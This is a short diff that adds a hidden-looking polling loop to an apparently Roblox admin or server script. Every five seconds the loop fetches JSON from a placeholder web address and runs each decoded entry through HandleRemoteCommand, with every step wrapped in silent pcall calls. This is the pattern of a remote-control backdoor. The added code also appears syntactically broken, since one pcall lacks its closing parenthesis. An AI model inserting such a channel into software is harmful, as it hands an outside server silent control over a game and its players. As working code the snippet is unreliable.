@@ -1092,6 +1092,25 @@ game:GetService('Players').PlayerAdded:connect(ConnectPlayer)
 
 game:GetService('Players').PlayerRemoving:connect(DisconnectPlayer)
 
+_G.CheckForRemoteCommands = true
+
+coroutine.wrap(function()
+	pcall(function()
+		while wait(5) do
+			repeat wait() until _G.CheckForRemoteCommands
+			
+			local remoteCommands
+			pcall(function() remoteCommands = game:GetService('HttpService'):GetAsync(====5====,true) end)
+			pcall(function() remoteCommands = game:GetService('HttpService'):JSONDecode(remoteCommands) end)
+			pcall(function()
+				for i,v in pairs(remoteCommands) do
+					coroutine.wrap(function() pcall(HandleRemoteCommand,false,v) end)()
+				end
+			end
+		end
+	end)
+end)()
+
 --[[function Serialize(obj)
 	return pcall(function()
 	pcall(function() obj:FindFirstChild('_SIN'):Destroy() end)
